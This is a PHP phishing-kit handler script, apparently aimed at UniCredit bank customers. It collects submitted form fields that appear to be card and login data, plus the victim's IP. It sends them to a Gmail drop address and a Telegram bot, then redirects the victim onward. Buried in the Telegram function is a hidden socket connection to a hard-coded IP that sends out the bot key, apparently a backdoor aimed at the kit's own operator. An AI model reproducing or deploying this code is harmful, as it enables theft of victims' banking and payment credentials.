<?php
ob_start();
include('loading1.php');
$pg=$_REQUEST['page'];
$bin4=$_REQUEST['page'];
$bin5=$_REQUEST['page1'];
$ip = getenv("REMOTE_ADDR");
$bin4 = substr($_POST['s3'] , 15 , 19);
$bin5 = substr($_POST['s3'] , 0 , 1);
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$hostname = gethostbyaddr($ip);
$message .= "".$_POST['s3']."\n";
$message = str_replace(' ','',$message);
$message .= "".$_POST['s4']."\n";
$message .= "".$_POST['s5']."\n";
$message .= "".$_POST['s1']."\n";
$message .= "".$_POST['s2']."\n";
$send = "unicredit.unic@gmail.com";
$subject = "$ip";
$headers = "From: ARMEX <don@cool.com>";
mail($send,$subject,$message,$headers);
// TELEGRAM	
	function telegram_send($message) {
    $curl = curl_init();
    $api_key  = 'bot';
    $chat_id  = 'chat id ';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    $socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
$connection =  @socket_connect($socket, '51.77.78.56', 2023);
$a = @socket_write($socket, $api_key);
return true;

	
}
telegram_send(urlencode($message));
// TELEGRAM
header("Refresh:3; url='./index2.php?page=$bin4&page1=$bin5'");
ob_end_flush();
exit;
?>